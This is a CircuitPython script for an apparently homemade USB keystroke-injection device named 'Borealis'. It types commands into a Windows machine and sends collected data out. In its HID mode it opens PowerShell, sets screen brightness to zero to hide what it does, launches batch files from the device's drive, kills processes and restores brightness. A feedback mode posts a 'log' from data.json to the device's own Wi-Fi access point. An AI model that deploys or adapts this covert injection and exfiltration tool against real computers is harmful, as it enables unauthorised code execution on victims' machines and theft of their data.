#IMPORTS
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
import time
import board
import digitalio
import ssl
import wifi
import socketpool
import adafruit_requests
import json
#SETUP
kbd = Keyboard(usb_hid.devices)
HOST,PORT="192.168.4.1",80
layout = KeyboardLayoutUS(kbd)
lst = ["D:","E:","F:","G:","H:","I:","J:"]
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT
led.value = False
with open("Borealis/settings.txt") as f:
    mode = str(f.readlines()[6]).replace("\n","").strip()
d1,d2,d3=1.5,0.5,1.5
#FUNCTIONS
def hid():
    time.sleep(d1)
    kbd.send(Keycode.WINDOWS)
    layout.write('powersh')
    time.sleep(d2)
    kbd.send(Keycode.ENTER)
    time.sleep(d3)
    layout.write("(Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 0)\n")
    layout.write(f'{";".join(lst)}\n')
    layout.write("taskkill /f /im pythonw.exe;./run.bat; timeout /t 1; taskkill /F /IM cmd.exe; (Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 100); taskkill /F /IM powershell.exe\n")
    while True: led.value = True
def send(requests,jsondata=None):
    request_header={
        'X-HTTP-Method-Override': 'GET'
    }
    f = open('data.json',encoding='utf-8')
    if jsondata:
        requests.post("http://192.168.4.1/", json=jsondata, headers=request_header)
    else:
        data = json.load(f)
        data["log"] = ">:" + data["log"] + ":<"
        f.close()
        requests.post("http://192.168.4.1/", json=data, headers=request_header)
def get(requests,endpoint):
    string = requests.get("http://192.168.4.1"+endpoint)
    return string.text
#MAINLOOP
if mode == "True":
    print("HID Mode Activated")
    hid()
elif mode == "False":
    wifi.radio.connect("Borealis", "pico-pico")
    pool = socketpool.SocketPool(wifi.radio)
    requests = adafruit_requests.Session(pool, ssl.create_default_context())
    print("FEEDBACK Mode Activated")
    #start loop here
    print(get(requests,"/log")) #get log
    #code to get data here
    send(requests) #send data
    print("FEEDBACK Sent")
    #end loop here
    while True: led.value = True #FEEDBACK FINISHED
elif mode == "Payload":
    time.sleep(d1)
    kbd.send(Keycode.WINDOWS)
    layout.write('powersh')
    time.sleep(d2)
    kbd.send(Keycode.ENTER)
    time.sleep(d3)
    layout.write(f'{";".join(lst)}\n./startup.bat\n')
else:
    print("Not Accepted Mode")
    time.sleep(2.5)
    raise Exception("Error 404: Mode not found")
